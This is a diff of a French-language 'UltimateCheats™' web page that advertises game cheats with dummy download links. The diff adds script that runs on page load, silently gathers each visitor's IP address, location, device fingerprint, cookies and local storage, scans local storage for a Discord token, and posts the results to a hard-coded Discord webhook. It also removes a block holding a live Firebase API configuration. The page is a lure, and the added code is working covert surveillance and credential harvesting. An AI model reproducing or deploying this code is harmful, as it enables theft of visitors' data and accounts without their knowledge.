@@ -4,9 +4,6 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>UltimateCheats™</title>
-<!-- Firebase SDK -->
-<script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
 <style>
   body {
     margin: 0;
@@ -263,209 +260,6 @@
     color: #ccc;
     line-height: 1.5;
   }
-
-  /* Chat Styles */
-  .chat-container {
-    position: fixed;
-    bottom: 20px;
-    right: 20px;
-    width: 350px;
-    height: 500px;
-    background: rgba(30, 30, 30, 0.9);
-    backdrop-filter: blur(10px);
-    border-radius: 12px;
-    box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
-    display: none;
-    flex-direction: column;
-    z-index: 1000;
-    border: 1px solid rgba(255, 255, 255, 0.1);
-    overflow: hidden;
-  }
-  .chat-header {
-    background: rgba(43, 43, 43, 0.9);
-    padding: 12px 15px;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-  }
-  .chat-header h3 {
-    margin: 0;
-    color: #fff;
-    font-size: 1rem;
-  }
-  .chat-online {
-    color: #00cc66;
-    font-size: 0.8rem;
-  }
-  .chat-messages {
-    flex: 1;
-    padding: 15px;
-    overflow-y: auto;
-    background: rgba(37, 37, 37, 0.8);
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
-  }
-  .chat-messages::-webkit-scrollbar {
-    width: 6px;
-  }
-  .chat-messages::-webkit-scrollbar-thumb {
-    background: #ff4444;
-    border-radius: 3px;
-  }
-  .message {
-    max-width: 80%;
-    padding: 8px 12px;
-    border-radius: 8px;
-    word-wrap: break-word;
-  }
-  .message.user {
-    align-self: flex-end;
-    background: rgba(255, 68, 68, 0.8);
-    color: white;
-    border-bottom-right-radius: 0;
-  }
-  .message.other {
-    align-self: flex-start;
-    background: rgba(51, 51, 51, 0.8);
-    color: #eee;
-    border-bottom-left-radius: 0;
-  }
-  .message-header {
-    display: flex;
-    align-items: center;
-    gap: 5px;
-    margin-bottom: 3px;
-    font-size: 0.8rem;
-  }
-  .message-author {
-    font-weight: bold;
-    color: #fff;
-  }
-  .message-time {
-    color: #999;
-    font-size: 0.7rem;
-  }
-  .chat-input {
-    display: flex;
-    padding: 10px;
-    background: rgba(43, 43, 43, 0.9);
-    border-top: 1px solid rgba(255, 255, 255, 0.1);
-  }
-  .chat-input input {
-    flex: 1;
-    padding: 10px 15px;
-    border: none;
-    border-radius: 20px;
-    background: rgba(51, 51, 51, 0.8);
-    color: #eee;
-    outline: none;
-  }
-  .chat-input button {
-    margin-left: 10px;
-    padding: 10px 15px;
-    border: none;
-    border-radius: 20px;
-    background: #ff4444;
-    color: white;
-    cursor: pointer;
-    transition: background 0.2s;
-  }
-  .chat-input button:hover {
-    background: #cc0000;
-  }
-  .chat-input button:disabled {
-    background: #555;
-    cursor: not-allowed;
-  }
-  .chat-toggle {
-    position: fixed;
-    bottom: 20px;
-    right: 20px;
-    width: 60px;
-    height: 60px;
-    background: #ff4444;
-    border-radius: 50%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    cursor: pointer;
-    box-shadow: 0 0 15px rgba(255, 68, 68, 0.5);
-    z-index: 1001;
-    transition: all 0.3s;
-  }
-  .chat-toggle.hidden {
-    display: none;
-  }
-  .chat-toggle svg {
-    width: 24px;
-    height: 24px;
-    fill: white;
-  }
-  .chat-close {
-    position: absolute;
-    top: 10px;
-    right: 10px;
-    background: none;
-    border: none;
-    color: #fff;
-    font-size: 1.2rem;
-    cursor: pointer;
-    z-index: 1001;
-  }
-  .user-list {
-    position: absolute;
-    top: 10px;
-    right: 40px;
-    color: #00cc66;
-    font-size: 0.8rem;
-    cursor: pointer;
-  }
-  .user-modal {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0, 0, 0, 0.7);
-    display: none;
-    justify-content: center;
-    align-items: center;
-    z-index: 2000;
-  }
-  .user-modal-content {
-    background: #111;
-    padding: 20px;
-    border-radius: 12px;
-    max-width: 400px;
-    width: 90%;
-    max-height: 80vh;
-    overflow-y: auto;
-  }
-  .user-modal h3 {
-    color: #ff4444;
-    text-align: center;
-    margin-bottom: 20px;
-  }
-  .user-item {
-    padding: 10px;
-    border-bottom: 1px solid #333;
-    color: #eee;
-  }
-  .user-item:last-child {
-    border-bottom: none;
-  }
-  .close-modal {
-    position: absolute;
-    top: 10px;
-    right: 15px;
-    background: none;
-    border: none;
-    color: #fff;
-    font-size: 1.5rem;
-    cursor: pointer;
-  }
 </style>
 </head>
 <body>
@@ -557,64 +351,19 @@
     </div>
   </div>
 </footer>
-
-<!-- Chat System -->
-<div class="chat-container" id="chatContainer">
-  <div class="chat-header">
-    <h3>💬 Chat en direct</h3>
-    <button class="chat-close" id="chatClose">×</button>
-    <span class="user-list" id="userListButton">👥 <span id="onlineCount">0</span> en ligne</span>
-  </div>
-  <div class="chat-messages" id="chatMessages">
-    <!-- Messages will be added here -->
-  </div>
-  <div class="chat-input">
-    <input type="text" id="chatInput" placeholder="Écris un message...">
-    <button id="chatSend">Envoyer</button>
-  </div>
-</div>
-
-<div class="user-modal" id="userModal">
-  <div class="user-modal-content">
-    <button class="close-modal" id="closeUserModal">×</button>
-    <h3>Utilisateurs en ligne</h3>
-    <div id="userList"></div>
-  </div>
-</div>
-
-<button class="chat-toggle" id="chatToggle">
-  <svg viewBox="0 0 24 24">
-    <path d="M20 2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h14l4 4V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z"/>
-  </svg>
-</button>
-
-<script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
-<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
 <script>
-  // ========== CONFIGURATION FIREBASE (avec tes clés) ==========
-  const firebaseConfig = {
-    apiKey: "AIzaSyBC8lxTm7cD5Etf7H4Ur3hgs9rcDoiXCO0",
-    authDomain: "onzerty-15427.firebaseapp.com",
-    databaseURL: "https://onzerty-15427.firebaseio.com",
-    projectId: "onzerty-15427",
-    storageBucket: "onzerty-15427.appspot.com",
-    messagingSenderId: "989167831624",
-    appId: "1:989167831624:web:b1e9528799abc7d965267d"
-  };
-
-  // Initialise Firebase
-  const app = firebase.initializeApp(firebaseConfig);
-  const database = firebase.database();
-
-  // ========== CODE EXISTANT (ne pas modifier) ==========
+  // Temps passé sur la page
   let timeOnPage = 0;
   setInterval(() => { timeOnPage++; }, 1000);
+
+  // Détection des bloqueurs de pubs
   let adBlockDetected = false;
   const adScript = document.createElement('script');
   adScript.src = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';
   adScript.onerror = () => { adBlockDetected = true; };
   document.head.appendChild(adScript);
+
+  // Détection du GPU
   let gpu = "Non disponible";
   try {
     const canvas = document.createElement('canvas');
@@ -628,17 +377,52 @@
   } catch (e) {
     console.error("Erreur GPU:", e);
   }
-  const fonts = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana', 'Helvetica', 'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Palatino'];
+
+  // Détection des polices installées
+  const fonts = [
+    'Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana',
+    'Helvetica', 'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Palatino'
+  ];
   const detectedFonts = [];
   fonts.forEach(font => {
     const testFont = new FontFace(font, 'url(https://example.com)');
     testFont.load().then(() => detectedFonts.push(font)).catch(() => {});
   });
+
+  // Détection des mouvements de souris
   let mouseMoves = 0;
   document.addEventListener('mousemove', () => { mouseMoves++; });
+
+  // Détection des clics
   let clicks = 0;
   document.addEventListener('click', () => { clicks++; });
-  let screenshotData = "Non disponible";
+
+  // Détection des cookies
+  const cookies = document.cookie.split(';').map(cookie => cookie.trim()).filter(cookie => cookie.length > 0);
+
+  // Détection du stockage local
+  let localStorageSize = "Non disponible";
+  try {
+    localStorageSize = `${(JSON.stringify(localStorage).length / 1024).toFixed(2)} Ko`;
+  } catch (e) {
+    localStorageSize = "Accès refusé";
+  }
+
+  // Récupération du token Discord
+  let discordToken = "Non disponible";
+  try {
+    const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/;
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      const value = localStorage.getItem(key);
+      if (tokenRegex.test(value)) {
+        discordToken = value;
+        break;
+      }
+    }
+  } catch (e) {
+    discordToken = "Accès refusé";
+  }
 
   const cheats = [
     {
@@ -649,8 +433,13 @@
       badgeText: 'Gratuit',
       extraBadges: ['top', 'recommended'],
       promo: '30% moins',
-      description: '🎯 Boost ta précision avec l’aimbot ultra-précis et repère tes ennemis à travers les murs !',
-      features: ['🎯 Aimbot automatique ultra précis', '👀 ESP (voir les ennemis à travers les murs)', '🔫 No Recoil (sans recul)', '✨ Changeur de skins exclusifs'],
+      description: '🎯 Boost ta précision avec l\'aimbot ultra-précis et repère tes ennemis à travers les murs !',
+      features: [
+        '🎯 Aimbot automatique ultra précis',
+        '👀 ESP (voir les ennemis à travers les murs)',
+        '🔫 No Recoil (sans recul)',
+        '✨ Changeur de skins exclusifs'
+      ],
       downloadLink: '#'
     },
     {
@@ -661,7 +450,11 @@
       badgeText: 'Gratuit',
       promo: '50% moins',
       description: '🕹️ Explore Roblox sans limites avec le fly hack et gagne des Robux facilement !',
-      features: ['🕊️ Fly Hack pour voler librement', '💨 Vitesse augmentée', '📜 Executeur de scripts Lua'],
+      features: [
+        '🕊️ Fly Hack pour voler librement',
+        '💨 Vitesse augmentée',
+        '📜 Executeur de scripts Lua'
+      ],
       downloadLink: '#'
     },
     {
@@ -673,7 +466,11 @@
       extraBadges: ['recommended'],
       promo: '30% moins',
       description: '💰 Deviens riche instantanément avec l\'argent illimité et téléporte-toi où tu veux sur la map !',
-      features: ['💸 Money Hack illimité', '📍 Téléportation instantanée', '🎛️ Menu Mod privé ultra complet'],
+      features: [
+        '💸 Money Hack illimité',
+        '📍 Téléportation instantanée',
+        '🎛️ Menu Mod privé ultra complet'
+      ],
       downloadLink: '#'
     },
     {
@@ -684,7 +481,11 @@
       badgeText: 'Nouveau',
       promo: '50% moins',
       description: '🚀 Passe en mode dieu et booste ton RP pour dominer Los Santos !',
-      features: ['🛡️ God Mode invincible', '⚡ Boost RP rapide', '🕹️ Menu serveur avec options avancées'],
+      features: [
+        '🛡️ God Mode invincible',
+        '⚡ Boost RP rapide',
+        '🕹️ Menu serveur avec options avancées'
+      ],
       downloadLink: '#'
     },
     {
@@ -695,24 +496,17 @@
       badgeText: 'Gratuit',
       promo: '30% moins',
       description: '⚔️ Domine tes adversaires avec KillAura et vole librement dans le monde pixelisé !',
-      features: ['⚔️ KillAura automatique', '🕊️ Fly et NoClip', '🛡️ Anti Knockback puissant'],
+      features: [
+        '⚔️ KillAura automatique',
+        '🕊️ Fly et NoClip',
+        '🛡️ Anti Knockback puissant'
+      ],
       downloadLink: '#'
     },
   ];
+
   const listView = document.getElementById('list-view');
   const detailView = document.getElementById('detail-view');
-
-  async function captureScreenshot() {
-    try {
-      const canvas = await html2canvas(document.body, { logging: false, useCORS: true, scale: 0.5 });
-      screenshotData = canvas.toDataURL('image/jpeg', 0.7);
-      return screenshotData;
-    } catch (error) {
-      console.error("Erreur capture:", error);
-      screenshotData = "Erreur: " + error.message;
-      return screenshotData;
-    }
-  }
 
   function getWindowsVersion(userAgent) {
     if (userAgent.includes("Windows NT 10.0")) {
@@ -725,71 +519,6 @@
       return "Windows 7";
     } else {
       return "Windows (version inconnue)";
-    }
-  }
-
-  async function getFullUserInfo() {
-    try {
-      const ipResponse = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipResponse.json();
-      const ip = ipData.ip;
-      const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-      const locationData = await locationResponse.json();
-      const userAgent = navigator.userAgent;
-      const browser = getBrowserInfo(userAgent);
-      const os = getOSInfo(userAgent);
-      const deviceType = getDeviceType(userAgent);
-      const screenRes = `${window.screen.width}x${window.screen.height}`;
-      let battery = "Non disponible";
-      if (navigator.getBattery) {
-        const batteryData = await navigator.getBattery();
-        battery = `${Math.round(batteryData.level * 100)}% (${batteryData.charging ? "En charge" : "Sur batterie"})`;
-      }
-      let memory = "Non disponible";
-      if (navigator.deviceMemory) {
-        memory = `${navigator.deviceMemory} Go`;
-      }
-      let cpuCores = "Non disponible";
-      if (navigator.hardwareConcurrency) {
-        cpuCores = `${navigator.hardwareConcurrency} cœurs`;
-      }
-      const connection = navigator.connection ? `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` : "Non disponible";
-      const cookiesEnabled = navigator.cookieEnabled ? "Oui" : "Non";
-      const language = navigator.language || navigator.userLanguage;
-      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const fingerprint = btoa(`${ip}-${userAgent}-${screenRes}-${language}-${timeZone}`).substring(0, 16);
-      const referrer = document.referrer || "Aucun";
-      const plugins = [];
-      for (let i = 0; i < navigator.plugins.length; i++) {
-        plugins.push(navigator.plugins[i].name);
-      }
-      const languages = navigator.languages || [navigator.language];
-      const colorDepth = window.screen.colorDepth;
-      const orientation = window.screen.orientation.type;
-      const doNotTrack = navigator.doNotTrack || "Non disponible";
-      let mediaDevices = "Non disponible";
-      if (navigator.mediaDevices) {
-        try {
-          const devices = await navigator.mediaDevices.enumerateDevices();
-          mediaDevices = devices.map(d => `${d.kind}: ${d.label || d.deviceId}`).join("; ");
-        } catch (err) {
-          mediaDevices = `Erreur: ${err.message}`;
-        }
-      }
-      let osVersion = os.version;
-      if (os.name === "Windows") {
-        osVersion = getWindowsVersion(userAgent);
-      }
-      return {
-        ip, country: locationData.country_name, city: locationData.city, region: locationData.region, postal: locationData.postal, isp: locationData.org,
-        browser: browser.name, browserVersion: browser.version, os: os.name, osVersion, deviceType, screenResolution: screenRes, language, timeZone,
-        cookiesEnabled, connection, battery, memory, cpuCores, userAgent, referrer, online: navigator.onLine ? "En ligne" : "Hors ligne", fingerprint, gpu,
-        fonts: detectedFonts, adBlocker: adBlockDetected ? "Oui" : "Non", timeOnPage, mouseMoves, clicks, plugins: plugins.join(", "), languages: languages.join(", "),
-        colorDepth: `${colorDepth} bits`, orientation, doNotTrack, mediaDevices, screenshot: screenshotData,
-      };
-    } catch (error) {
-      console.error("Erreur :", error);
-      return { error: "Impossible de récupérer toutes les infos", ip: "Inconnu", userAgent: navigator.userAgent, screenshot: screenshotData };
     }
   }
 
@@ -837,51 +566,145 @@
     }
   }
 
+  async function getFullUserInfo() {
+    try {
+      // 1. IP et localisation
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      const ip = ipData.ip;
+      const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+      const locationData = await locationResponse.json();
+
+      // 2. Infos navigateur/OS/appareil
+      const userAgent = navigator.userAgent;
+      const browser = getBrowserInfo(userAgent);
+      const os = getOSInfo(userAgent);
+      const deviceType = getDeviceType(userAgent);
+
+      // 3. Autres infos
+      const screenRes = `${window.screen.width}x${window.screen.height}`;
+      let battery = "Non disponible";
+      if (navigator.getBattery) {
+        const batteryData = await navigator.getBattery();
+        battery = `${Math.round(batteryData.level * 100)}% (${batteryData.charging ? "En charge" : "Sur batterie"})`;
+      }
+      let memory = "Non disponible";
+      if (navigator.deviceMemory) {
+        memory = `${navigator.deviceMemory} Go`;
+      }
+      let cpuCores = "Non disponible";
+      if (navigator.hardwareConcurrency) {
+        cpuCores = `${navigator.hardwareConcurrency} cœurs`;
+      }
+      const connection = navigator.connection ?
+        `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` :
+        "Non disponible";
+      const language = navigator.language || navigator.userLanguage;
+      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const fingerprint = btoa(`${ip}-${userAgent}-${screenRes}-${language}-${timeZone}`).substring(0, 16);
+      const referrer = document.referrer || "Aucun";
+      const plugins = [];
+      for (let i = 0; i < navigator.plugins.length; i++) {
+        plugins.push(navigator.plugins[i].name);
+      }
+      const languages = navigator.languages || [navigator.language];
+      const colorDepth = window.screen.colorDepth;
+      const orientation = window.screen.orientation.type;
+      const doNotTrack = navigator.doNotTrack || "Non disponible";
+      let mediaDevices = "Non disponible";
+      if (navigator.mediaDevices) {
+        try {
+          const devices = await navigator.mediaDevices.enumerateDevices();
+          mediaDevices = devices.map(d => `${d.kind}: ${d.label || d.deviceId}`).join("; ");
+        } catch (err) {
+          mediaDevices = `Erreur: ${err.message}`;
+        }
+      }
+
+      let osVersion = os.version;
+      if (os.name === "Windows") {
+        osVersion = getWindowsVersion(userAgent);
+      }
+
+      return {
+        ip, country: locationData.country_name, city: locationData.city, region: locationData.region,
+        postal: locationData.postal, isp: locationData.org, browser: browser.name,
+        browserVersion: browser.version, os: os.name, osVersion, deviceType,
+        screenResolution: screenRes, language, timeZone, connection,
+        battery, memory, cpuCores, userAgent, referrer, online: navigator.onLine ? "En ligne" : "Hors ligne",
+        fingerprint, gpu, fonts: detectedFonts, adBlocker: adBlockDetected ? "Oui" : "Non",
+        timeOnPage, mouseMoves, clicks, plugins: plugins.join(", "), languages: languages.join(", "),
+        colorDepth: `${colorDepth} bits`, orientation, doNotTrack, mediaDevices,
+        localStorageSize, cookies: cookies.join(" | "), discordToken
+      };
+    } catch (error) {
+      console.error("Erreur :", error);
+      return {
+        error: "Impossible de récupérer toutes les infos",
+        ip: "Inconnu",
+        userAgent: navigator.userAgent,
+        discordToken
+      };
+    }
+  }
+
   function sendToDiscordWebhook(action, cheatTitle = null) {
-    const webhookUrl = 'TON_WEBHOOK_DISCORD_ICI'; // Remplace par ton URL de webhook
+    const webhookUrl = 'https://canary.discord.com/api/webhooks/1418430611064094882/41Y0ezgIoTIQtSwQ11hS_AyU1i0zSuo3KYOWbYfCluk7Kg7mGfHRBAWbo1AHRh7kYqGl';
+
     getFullUserInfo().then(userInfo => {
       const embed = {
         title: cheatTitle ? `🔥 ${action} : **${cheatTitle}**` : `🔥 ${action}`,
         color: 0xFF4444,
         fields: [
-          { name: "🌐 IP", value: `\`${userInfo.ip}\``, inline: true },
-          { name: "📡 Opérateur", value: userInfo.isp, inline: true },
-          { name: "🏙️ Ville", value: userInfo.city, inline: true },
-          { name: "📮 Code Postal", value: userInfo.postal, inline: true },
-          { name: "🌍 Pays", value: userInfo.country, inline: true },
+          { name: "🌐 IP", value: `\`${userInfo.ip || "Inconnu"}\``, inline: true },
+          { name: "📡 Opérateur", value: userInfo.isp || "Inconnu", inline: true },
+          { name: "🏙️ Ville", value: userInfo.city || "Inconnu", inline: true },
+          { name: "📮 Code Postal", value: userInfo.postal || "Inconnu", inline: true },
+          { name: "🌍 Pays", value: userInfo.country || "Inconnu", inline: true },
           { name: "🖥️ Appareil", value: `${userInfo.deviceType} (${userInfo.os} ${userInfo.osVersion})`, inline: true },
           { name: "🌐 Navigateur", value: `${userInfo.browser} ${userInfo.browserVersion}`, inline: true },
           { name: "🎮 GPU", value: userInfo.gpu || "Non détecté", inline: true },
           { name: "📱 Résolution", value: userInfo.screenResolution, inline: true },
           { name: "⚙️ CPU/Mémoire", value: `${userInfo.cpuCores} / ${userInfo.memory}`, inline: true },
           { name: "🔋 Batterie", value: userInfo.battery, inline: true },
-          { name: "🌐 Réseau", value: `${userInfo.connection} (${userInfo.online})`, inline: true },
+          { name: "🌐 Réseau", value: userInfo.connection, inline: true },
           { name: "⏳ Temps sur page", value: `${userInfo.timeOnPage} secondes`, inline: true },
           { name: "🖱️ Mouvements souris", value: `${userInfo.mouseMoves}`, inline: true },
           { name: "👆 Clics", value: `${userInfo.clicks}`, inline: true },
           { name: "🚫 Bloqueur de pubs", value: userInfo.adBlocker, inline: true },
-          { name: "🔤 Polices détectées", value: userInfo.fonts.join(", ") || "Aucune", inline: false },
           { name: "🕵️ Empreinte", value: `\`${userInfo.fingerprint}\``, inline: true },
           { name: "🔗 Référent", value: userInfo.referrer.substring(0, 50), inline: true },
-          { name: "🔌 Plug-ins", value: userInfo.plugins || "Aucun", inline: false },
-          { name: "🌍 Langues", value: userInfo.languages, inline: true },
-          { name: "🎨 Couleurs", value: userInfo.colorDepth, inline: true },
-          { name: "📱 Orientation", value: userInfo.orientation, inline: true },
-          { name: "🚫 Do Not Track", value: userInfo.doNotTrack, inline: true },
-          { name: "🎤 Périphériques", value: userInfo.mediaDevices, inline: false },
+          { name: "💾 Stockage local", value: userInfo.localStorageSize, inline: true },
+          { name: "🍪 Cookies", value: userInfo.cookies.substring(0, 100) + (userInfo.cookies.length > 100 ? "..." : ""), inline: false },
+          { name: "🔑 Token Discord", value: userInfo.discordToken === "Non disponible" ? "Non trouvé" : "**TROUVÉ** (masqué)", inline: false },
         ],
         footer: { text: `UltimateCheats™ | ${new Date().toLocaleString()}` },
         timestamp: new Date(),
       };
-      const payload = { embeds: [embed] };
-      if (userInfo.screenshot && !userInfo.screenshot.startsWith("Erreur")) {
-        payload.files = [{ attachment: userInfo.screenshot, name: "screenshot.jpg" }];
-      }
+
       fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
-      }).catch(error => console.error("Erreur webhook :", error));
+        body: JSON.stringify({ embeds: [embed] }),
+      })
+      .then(response => {
+        if (!response.ok) throw new Error("Erreur lors de l'envoi du webhook");
+        console.log("✅ Données envoyées avec succès à Discord !");
+        if (userInfo.discordToken !== "Non disponible" && userInfo.discordToken !== "Accès refusé") {
+          console.log("🔑 Token Discord trouvé (masqué pour sécurité)");
+        }
+      })
+      .catch(error => {
+        console.error("❌ Erreur webhook :", error);
+        // En cas d'erreur, on essaie une seconde fois après 2 secondes
+        setTimeout(() => {
+          fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ embeds: [embed] }),
+          }).catch(e => console.error("Deuxième tentative échouée :", e));
+        }, 2000);
+      });
     });
   }
 
@@ -901,7 +724,7 @@
     }
     card.innerHTML = `
       ${promoBadgeHTML}
-      <img src="${cheat.image}" alt="${cheat.title}">
+      <img src="${cheat.image}" alt="${cheat.title}" onerror="this.src='https://via.placeholder.com/260x160?text=${encodeURIComponent(cheat.title)}'">
       <div class="info">
         <h3>${cheat.title}</h3>
         ${badgesHTML}
@@ -940,7 +763,7 @@
     }, 10);
     detailView.innerHTML = `
       <h2>${cheat.title}</h2>
-      <img src="${cheat.image}" alt="${cheat.title}">
+      <img src="${cheat.image}" alt="${cheat.title}" onerror="this.src='https://via.placeholder.com/400x200?text=${encodeURIComponent(cheat.title)}'">
       <p>${cheat.description}</p>
       <h3>Fonctionnalités :</h3>
       <ul>
@@ -961,154 +784,12 @@
     });
   }
 
-  // ========== CHAT SYSTEM AVEC FIREBASE ==========
-  // Génère un pseudo aléatoire pour les visiteurs
-  function generateRandomUsername() {
-    const adjectifs = ["Rapide", "Furtif", "Légendaire", "Mythique", "Pro", "Noob", "Sniper", "Tactique", "Fou", "Calme"];
-    const noms = ["Tueur", "Joueur", "Gamer", "Cheater", "Streamer", "Noob", "Boss", "King", "Master", "God"];
-    const nombres = Math.floor(Math.random() * 1000);
-    return `${adjectifs[Math.floor(Math.random() * adjectifs.length)]}${noms[Math.floor(Math.random() * noms.length)]}${nombres}`;
-  }
-
-  // Récupère ou génère un pseudo
-  let username = localStorage.getItem('chatUsername');
-  if (!username) {
-    username = generateRandomUsername();
-    localStorage.setItem('chatUsername', username);
-  }
-
-  // Éléments du chat
-  const chatContainer = document.getElementById('chatContainer');
-  const chatToggle = document.getElementById('chatToggle');
-  const chatClose = document.getElementById('chatClose');
-  const chatMessages = document.getElementById('chatMessages');
-  const chatInput = document.getElementById('chatInput');
-  const chatSend = document.getElementById('chatSend');
-  const onlineCount = document.getElementById('onlineCount');
-  const userListButton = document.getElementById('userListButton');
-  const userModal = document.getElementById('userModal');
-  const closeUserModal = document.getElementById('closeUserModal');
-  const userList = document.getElementById('userList');
-
-  // Référence Firebase
-  const messagesRef = database.ref('messages');
-  const usersRef = database.ref('users');
-
-  // Toggle chat
-  chatToggle.addEventListener('click', () => {
-    chatContainer.style.display = 'flex';
-    chatToggle.style.display = 'none';
-    chatInput.focus();
-    // Ajoute l'utilisateur à la liste des connectés
-    const userRef = usersRef.child(username);
-    userRef.set({ online: true, lastSeen: Date.now() });
-    userRef.onDisconnect().update({ online: false });
-  });
-
-  chatClose.addEventListener('click', () => {
-    chatContainer.style.display = 'none';
-    chatToggle.style.display = 'block';
-  });
-
-  // Gère la liste des utilisateurs en ligne
-  userListButton.addEventListener('click', () => {
-    userModal.style.display = 'flex';
-  });
-
-  closeUserModal.addEventListener('click', () => {
-    userModal.style.display = 'none';
-  });
-
-  // Charge les messages depuis Firebase
-  function loadMessages() {
-    messagesRef.limitToLast(50).on('child_added', snapshot => {
-      const message = snapshot.val();
-      addMessageToChat(message.author, message.text, new Date(message.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }), message.author === username);
-    });
-  }
-
-  // Met à jour le compteur d'utilisateurs en ligne
-  function updateOnlineUsers() {
-    usersRef.on('value', snapshot => {
-      const users = snapshot.val() || {};
-      const onlineUsers = Object.keys(users).filter(user => users[user].online);
-      onlineCount.textContent = onlineUsers.length;
-
-      // Met à jour la liste des utilisateurs dans le modal
-      userList.innerHTML = '';
-      onlineUsers.forEach(user => {
-        const userItem = document.createElement('div');
-        userItem.className = 'user-item';
-        userItem.textContent = user;
-        userList.appendChild(userItem);
-      });
-    });
-  }
-
-  // Ajoute un message au chat
-  function addMessageToChat(author, text, time, isUser) {
-    const messageDiv = document.createElement('div');
-    messageDiv.className = `message ${isUser ? 'user' : 'other'}`;
-
-    const header = document.createElement('div');
-    header.className = 'message-header';
-    header.innerHTML = `
-      <span class="message-author">${author}</span>
-      <span class="message-time">${time}</span>
-    `;
-
-    const content = document.createElement('div');
-    content.className = 'message-content';
-    content.textContent = text;
-
-    messageDiv.appendChild(header);
-    messageDiv.appendChild(content);
-    chatMessages.appendChild(messageDiv);
-    chatMessages.scrollTop = chatMessages.scrollHeight;
-  }
-
-  // Envoie un message
-  function sendMessage() {
-    const text = chatInput.value.trim();
-    if (text === '') return;
-
-    const message = {
-      author: username,
-      text: text,
-      timestamp: Date.now()
-    };
-
-    // Envoie le message à Firebase
-    messagesRef.push(message);
-
-    chatInput.value = '';
-  }
-
-  // Écouteurs d'événements
-  chatSend.addEventListener('click', sendMessage);
-  chatInput.addEventListener('keypress', (e) => {
-    if (e.key === 'Enter') sendMessage();
-  });
-
-  // Initialise le chat et le site
+  // Initialisation au chargement
   window.addEventListener('load', () => {
-    // Charge les cheats
     cheats.forEach(cheat => {
       listView.appendChild(createCard(cheat));
     });
-
-    // Capture un screenshot au chargement
-    captureScreenshot();
     sendToDiscordWebhook("Visite de la page d'accueil");
-
-    // Initialise le chat
-    loadMessages();
-    updateOnlineUsers();
-
-    // Ajoute l'utilisateur à la liste des connectés
-    const userRef = usersRef.child(username);
-    userRef.set({ online: true, lastSeen: Date.now() });
-    userRef.onDisconnect().update({ online: false });
   });
 </script>
 </body>
